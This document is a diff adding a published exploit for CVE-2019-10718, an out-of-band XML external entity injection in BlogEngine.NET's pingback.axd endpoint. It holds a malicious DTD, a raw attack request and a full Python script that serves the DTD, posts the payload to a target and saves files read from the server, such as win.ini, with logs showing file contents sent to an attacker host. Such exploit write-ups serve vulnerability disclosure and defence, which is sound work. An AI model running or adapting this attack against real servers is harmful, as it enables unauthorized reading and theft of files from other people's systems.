@@ -1,0 +1,190 @@
+# Exploit Title: Out-of-band XML External Entity Injection on BlogEngine.NET
+# Date: 19 June 2019
+# Exploit Author: Aaron Bishop
+# Vendor Homepage: https://blogengine.io/
+# Version: v3.3.7
+# Tested on: 3.3.7, 3.3.6
+# CVE : 2019-10718
+
+#1. Description
+#==============
+
+#BlogEngine.NET is vulnerable to an Out-of-Band XML External Entity
+#Injection attack on **/pingback.axd**.
+
+#2. Proof of Concept
+#=============
+
+#Host the following malicious DTD on a web server that is accessible to the
+#target system:
+
+#~~~
+#<!ENTITY % p1 SYSTEM "file:///C:/Windows/win.ini">
+#<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://$LHOST/X?%p1;'>"> %p2
+#~~~
+
+#Submit a request to `pingback.axd` containing a malicious XML body:
+
+#~~~{command="REQUEST"}
+#POST /pingback.axd HTTP/1.1
+#Host: $RHOST
+#Accept-Encoding: gzip, deflate
+#Connection: close
+#User-Agent: python-requests/2.12.4
+#Accept: */*
+#Content-Type: text/xml
+#Content-Length: 131
+
+#<?xml version="1.0"?>
+#<!DOCTYPE foo SYSTEM "http://$LHOST/ex.dtd">
+#<foo>&e1;</foo>
+#<methodName>pingback.ping</methodName>
+#~~~
+
+#The application will request the remote DTD and submit a subsequent request
+#containing the contents of the file:
+
+#~~~
+#$RHOST - - [17/May/2019 12:03:32] "GET /ex.dtd HTTP/1.1" 200 -
+#$RHOST - - [17/May/2019 12:03:32] "GET
+#/X?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1
+#HTTP/1.1" 200 -
+#~~~
+
+#! /usr/bin/env python3
+import argparse
+import http.server
+import json
+import multiprocessing
+import os
+import re
+import requests
+import sys
+import time
+import urllib
+
+"""
+Exploit for CVE-2019-10718
+
+CVE Identified by: Aaron Bishop
+Exploit written by: Aaron Bishop
+
+Submit a XML to the target, get the contents of the file in a follow up request from the target
+
+python3 CVE-2019-10718.py --rhost http://$RHOST --lhost $LHOST --lport $LPORT --files C:/Windows/win.ini C:/Users/Administrator/source/repos/BlogEngine.NET/BlogEngine/web.config C:/inetpub/wwwroot/iisstart.htm C:/Windows/iis.log C:/Users/Public/test.txt
+
+Requesting C:/Windows/win.ini ...
+$RHOST - - [16/May/2019 17:07:25] "GET /ex.dtd HTTP/1.1" 200 -
+$RHOST - - [16/May/2019 17:07:25] "GET /X?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1 HTTP/1.1" 200 -
+
+Requesting C:/Users/Administrator/source/repos/BlogEngine.NET/BlogEngine/web.config ...
+$RHOST - - [16/May/2019 17:07:26] "GET /ex.dtd HTTP/1.1" 200 -
+Unable to read C:/Users/Administrator/source/repos/BlogEngine.NET/BlogEngine/web.config
+
+Requesting C:/inetpub/wwwroot/iisstart.htm ...
+$RHOST - - [16/May/2019 17:07:30] "GET /ex.dtd HTTP/1.1" 200 -
+Unable to read C:/inetpub/wwwroot/iisstart.htm
+
+Requesting C:/Windows/iis.log ...
+$RHOST - - [16/May/2019 17:07:34] "GET /ex.dtd HTTP/1.1" 200 -
+Unable to read C:/Windows/iis.log
+
+Requesting C:/Users/Public/test.txt ...
+$RHOST - - [16/May/2019 17:07:38] "GET /ex.dtd HTTP/1.1" 200 -
+$RHOST - - [16/May/2019 17:07:38] "GET /X?This%20is%20a%20test HTTP/1.1" 200 -
+
+"""
+
+xml = """<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://{lhost}:{lport}/ex.dtd">
+<foo>&e1;</foo>
+<methodName>pingback.ping</methodName>
+"""
+
+dtd = """<!ENTITY % p1 SYSTEM "file:///{fname}">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://{lhost}:{lport}/X?%p1;'>"> %p2;
+"""
+
+proxies = {
+            "http": "127.0.0.1:8080",
+            "https": "127.0.0.1:8080"
+          }
+
+file_queue = multiprocessing.Queue()
+response_queue = multiprocessing.Queue()
+response_counter = multiprocessing.Value('i', 0)
+
+class S(http.server.SimpleHTTPRequestHandler):
+    server_version = 'A Patchey Webserver'
+    sys_version = '3.1415926535897932384626433832795028841971693993751058209749445923078'
+    error_message_format = 'Donde esta la biblioteca?'
+
+    def _set_headers(self):
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/xml')
+            self.end_headers()
+
+    def do_GET(self):
+        if self.path.endswith(".dtd"):
+            self._set_headers()
+            self.wfile.write(dtd.format(fname=file_queue.get(), lhost=self.lhost, lport=self.lport).encode('utf-8'))
+        elif self.path.startswith("/X"):
+            self._set_headers()
+            response_counter.value += 1
+            response_queue.put(self.path)
+            self.wfile.write('<response>Thanks</response>'.encode('utf-8'))
+        else:
+            self._set_headers()
+            self.wfile.write('<error>?</error>')
+
+
+def start_server(lhost, lport, server):
+    httpd = http.server.HTTPServer((lhost, lport), server)
+    httpd.serve_forever()
+
+def main(rhost, lhost, lport, files, timeout, proxy, output_dir):
+    print(output_dir)
+    if not output_dir:
+        return
+    for f in files:
+        file_queue.put_nowait(f)
+
+    server = S
+    server.lhost, server.lport = lhost, lport
+    p = multiprocessing.Process(target=start_server, args=(lhost,lport,server))
+    p.start()
+    for num, f in enumerate(files):
+        print("\nRequesting {} ...".format(f))
+        count = 0
+        r = requests.post(rhost + "/pingback.axd", data=xml.format(lhost=lhost, lport=lport), proxies=proxies if proxy else {}, headers={"Content-Type": "text/xml"})
+        response = True
+        while num == response_counter.value:
+            if count >= timeout:
+                response = False
+                response_counter.value += 1
+                print("Unable to read {}".format(f))
+                break
+            time.sleep(1)
+            count += 1
+        if response:
+            os.makedirs(output_dir, exist_ok=True)
+            with open("{}/{}".format(output_dir, os.path.splitdrive(f)[1].replace(':','').replace('/','_')), 'w') as fh:
+                fh.write(urllib.parse.unquote(response_queue.get()).replace('/X?',''))
+
+    p.terminate()
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10718 OOB XXE')
+    parser.add_argument('-r', '--rhost', action="store", dest="rhost", required=True, help='Target host')
+    parser.add_argument('-l', '--lhost', action="store", dest="lhost", required=True, help='Local host')
+    parser.add_argument('-p', '--lport', action="store", dest="lport", type=int, required=True, help='Local port')
+    parser.add_argument('-f', '--files', nargs='+', default="C:/Windows/win.ini", help='Files to read on RHOST')
+    parser.add_argument('-t', '--timeout', type=int, default=3, help='How long to wait before moving on to next file')
+    parser.add_argument('-x', '--proxy', dest="proxy", action="store_true", default=False, help='Pass requests through a proxy')
+    parser.add_argument('-o', '--output', nargs='?', default="./CVE-2019-10718", help='Output directory.  Default ./CVE-2019-10718')
+    args = parser.parse_args()
+
+    if isinstance(args.files, str):
+        args.files = [args.files]
+    main(args.rhost, args.lhost, args.lport, args.files, args.timeout, args.proxy, args.output)
